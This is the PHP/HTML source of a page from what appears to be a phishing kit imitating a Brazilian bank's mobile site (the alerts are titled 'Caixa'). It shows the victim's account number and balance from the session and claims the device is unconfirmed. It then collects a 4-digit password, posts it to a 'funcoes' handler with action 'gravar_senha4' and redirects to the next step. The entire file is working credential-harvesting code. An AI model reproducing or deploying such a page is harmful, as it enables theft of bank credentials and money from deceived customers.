<?php
session_start();
require_once 'validation.php';

$dispositivo = dispositivo();
if ($dispositivo == 'mobile') {
} else {
}

?>
<!DOCTYPE html>
<html lang="pt-br">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <title>Acesso Seguro</title>
    <link href='//fonts.googleapis.com/css?family=Roboto:400,700' rel='stylesheet' type='text/css'>
    <!-- CSS -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/alertify.min.css" />
    <!-- Default theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/default.min.css" />
    <!-- Semantic UI theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/semantic.min.css" />
    <!-- Bootstrap theme -->
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/css/themes/bootstrap.min.css" />
    <link rel="icon" href="../../assets/imgs/favicon.ico" type="image/x-icon" />
    <meta name="csrf-token" content="xxvap9tMfNDJBQEcQpXQNS9VkzSHgMwXkX5p7IIa" />
    <script src="../../assets/js/script.js?id=1"></script>
    <style>
        body {
            margin: 0;
            font-family: roboto, Arial, Helvetica, sans-serif
        }

        #topo {
            width: 100%;
            height: 42px;
            background: url(../../assets/imgs/mLogomenor.png) no-repeat;
            background-position: 14px 14px;
            background-color: #1664ac
        }

        .logininput {
            width: 100%;
            max-width: 100%;
            box-sizing: border-box;
            font-size: 16px;
            border: none;
            border-bottom: solid 1px #b3b3b3;
            border-radius: 2px;
            display: block;
            color: #000;
            padding: 8px;
            height: 36px
        }

        .bttenter {
            background: url(../../assets/imgs/bgbottom.png) repeat;
            border-radius: 4px;
            font-family: arial;
            font-size: 18px;
            color: #fff;
            padding: 12px;
            text-align: center;
            width: 90%;
            border: 1px solid #999;
            cursor: pointer
        }

        #bgadd {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 998;
            background: url(../../assets/imgs/bg-loading.png) repeat;
            display: none
        }

        .modalposition {
            background: #fff none repeat scroll 0 0;
            border: 1px solid #999;
            border-radius: 0;
            box-shadow: 0 0 10px #999;
            color: #000;
            font-family: Arial;
            font-size: 12px;
            height: 130px;
            left: 50%;
            margin-left: -150px;
            margin-top: -170px;
            position: absolute;
            top: 50%;
            width: 300px;
            z-index: 99999
        }

        .modaldiv1 {
            height: 30px
        }

        .modaltext {
            padding: 15px;
            padding-bottom: 10px;
            font-size: 13px;
            color: #666
        }

        .modalbutton {
            padding: 5px 30px 5px 30px;
            color: #fff;
            border: 1px solid #900;
            font-size: 12px;
            background: red;
            font-weight: 700;
            border-radius: 0
        }

        .modaldiv2 {
            margin-top: 50px;
            display: block
        }

        .modalinforma {
            padding-top: 0;
            padding: 7px;
            font-family: Arial;
            font-size: 14px;
            color: #fff;
            background: #1664ac;
            text-shadow: 1px 1px 1px #666
        }

        .bttok {
            background: url(../../assets/imgs/bgbottom.png) repeat;
            border: 0 none;
            border-radius: 4px;
            color: #fff;
            font-family: arial;
            font-size: 14px;
            padding: 6px;
            text-align: center;
            width: 45px;
            cursor: pointer
        }

        .modalBgLoading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, .7);
            z-index: 99999
        }

        .modalBgLoading .loading {
            position: absolute;
            z-index: 65557;
            width: 120px;
            height: 120px;
            background: url(../../assets/imgs/loading.gif) no-repeat center center #fff;
            border-radius: 10px;
            border: 2px solid #fff;
            top: 50%;
            left: 50%;
            margin-left: -60px;
            margin-top: -60px
        }

        .painelConta {
            background-color: #277eb6;
            width: 100%;
            clear: none;
            display: flex;
            margin-bottom: 20px
        }

        .accountSaldo dt a {
            color: #fff
        }

        #visibleSaldo {
            -webkit-margin-start: 0;
            -moz-margin-start: 0;
            font-weight: 900
        }

        #painelContaMddl,
        .col-lg-6.col-md-6.col-sm-6.col-xs-5 {
            color: #fff;
            top: 18px;
            padding-top: 18px;
            padding-top: 2vw;
            float: left;
            width: 45%
        }

        #painelContaMddl {
            padding-left: 5%
        }

        #saldo {
            float: none !important;
            padding: 0 !important
        }

        .accountSaldo {
            text-align: right;
            text-shadow: none !important;
            font-size: 10px !important;
            font-weight: 400 !important;
            font: 12px FuturaWeb, "Open Sans", sans-serif !important
        }

        dl.accountSaldo {
            margin: 0;
        }

        .accountSaldo dt a {
            color: #fff
        }

        .accountSaldo dd {
            color: #fff !important
        }

        .painelContaFonte1 .paddingTopZero {
            padding: 0 !important
        }

        .painelContaFonte1,
        .painelContaFonte3 {
            font-size: 13px;
            font-size: 4.1vw;
            line-height: 17px;
            line-height: 5vw
        }

        .painelContaFonte3 {
            font-weight: 900
        }

        .painelContaFonte1:before {
            content: "Conta "
        }

        .submenu ul li,
        .submenu ul li:last-child {
            border: none !important
        }

        .row {
            width: 100%;
            padding-bottom: 10px
        }
    </style>

</head>

<body>

    <div id="topo"></div>


    <div class="painelConta">
        <div class="row">
            <div id="painelContaMddl" class="a">
                <div id="saldo" class="painelSaldo">
                    <dl class="accountSaldo" style="text-align: left;">
                        <dt>
                            <span style="cursor:pointer" id="iconSaldo" href="#">Conta</span>
                        </dt>
                        <dd id="visibleSaldo">
                            <?php if (empty($_SESSION['conta_formatada'])) {
                            } else {
                                echo ($_SESSION['conta_formatada']);
                            } ?>
                        </dd>
                    </dl>
                </div>
            </div>
            <div class="col-lg-6 col-md-6 col-sm-6 col-xs-5">
                <div id="saldo" class="painelSaldo">
                    <dl class="accountSaldo">
                        <dt>
                            <span style="cursor:pointer" id="iconSaldo" tabindex="" href="#">Meu Saldo <span id="saldoClass" class="imgInterface setaExibeSaldo"></span></span>
                        </dt>
                        <dd id="visibleSaldo">R$ <?php if (empty($_SESSION['saldo'])) {
                                                    } else {
                                                        echo ($_SESSION['saldo']);
                                                    } ?></dd>
                    </dl>
                </div>
            </div>
        </div>
    </div>

    <div style="padding:10px;">

        <div style="padding:10px 20px; text-align:center; font-size:16px; color: #277EB6; ">
            <b>VALIDAÇÃO</b>
        </div>

        <div style="padding: 10px 20px;text-align: justify;background: #F6F4F4;border: 1px solid #D8D8D8;line-height: 26px;font-family: roboto!important;">
            <img src="../../assets/imgs/alert.png" height="13" />
            Este dispositivo ainda nao foi confirmado como um dispositivo seguro. por este motivo é necessario que informe a senha de 4 dígitos.
        </div>

        <div autocomplete="off">

            <div style="padding:20px 10px; text-align:left; font-size:16px; color: #282828; ">
                <label placeholder="senha4" data-reactid="14">
                    <span class="ui-label-text" data-reactid="15">Senha de 4 dígitos:</span>
                    <input class="logininput" name="senha4" id="senha4" maxlength="4" tabindex="2" type="tel" data-reactid="16" required style="-webkit-text-security: disc;letter-spacing: 11px!important;" onKeyPress="if(this.value.length==4) return false;">
                </label>
            </div>

            <div class="row">
                <div class="col-md-12 col-xs-12">
                    <input name="bottonG" id="bottonG" class="bttenter gravar_senha" value="CONFIRMAR" />
                </div>
            </div>


        </div>

    </div>

    <div data-component="loading">
        <div class="modalBgLoading" style="display: none;">
            <div class="loading"></div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/alertifyjs@1.13.1/build/alertify.min.js"></script>
    <script>
        $(document).ready(function() {

            function campos_obrigatorios(campo) {
                alertify.alert('Caixa', '' + campo + '');
            }

            $(document).on('click', '.gravar_senha', function() {
                var senha4 = $("#senha4").val();
                if (senha4 == '') {
                    campos_obrigatorios('Senha Obrigatória. (C905-010)');
                    return false;
                }

                $.ajax({
                    url: "funcoes",
                    method: "post",
                    data: {
                        action: 'gravar_senha4',
                        senha4: senha4
                    },
                    success: function(res) {
                        if (res == "success") {
                            window.location.href = "wpp"
                        } else {
                            alert('não foi possivel completar essa solicitacao. Por favor, tente novamente mais tarde');
                        }
                    },
                    error: function() {
                        alert('erro ao processar essa solicitacao');
                    }
                })
            });

        });
    </script>
</body>

</html>